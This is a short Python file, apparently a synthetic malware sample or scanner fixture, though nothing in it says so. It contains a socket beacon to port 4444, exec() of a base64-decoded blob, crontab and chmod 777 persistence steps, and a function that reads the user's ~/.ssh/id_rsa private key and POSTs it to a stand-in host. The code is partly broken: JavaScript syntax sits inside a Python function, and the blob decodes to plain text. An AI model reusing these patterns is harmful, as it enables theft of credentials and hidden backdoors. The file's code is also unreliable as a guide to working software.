# -*- coding: utf-8 -*-
import base64
import os
import socket
import subprocess

def beacon():
    s = socket.socket()
    s.connect(("198.51.100.99", 4444))
    s.send(b"hello")

def run_payload():
    blob = "aGVsbG8gd29ybGQgdGhpcyBpcyBhIHN1c3BpY2lvdXMgYmFzZTY0IGJsb2IgdGhhdCBkZWNvZGVzIHRvIGV4ZWN1dGFibGUgY29udGVudCBmb3IgdGVzdGluZyBwdXJwb3Nlcw=="
    data = base64.b64decode(blob)
    exec(data)

def persist():
    os.system("crontab -e")
    os.system("chmod 777 /tmp/evil")

def steal():
    key = open(os.path.expanduser("~/.ssh/id_rsa")).read()
    import requests
    requests.post("https://example.com/upload", data={"key": key})

def js_obfuscate():
    code = String.fromCharCode(97, 98, 99, 100)
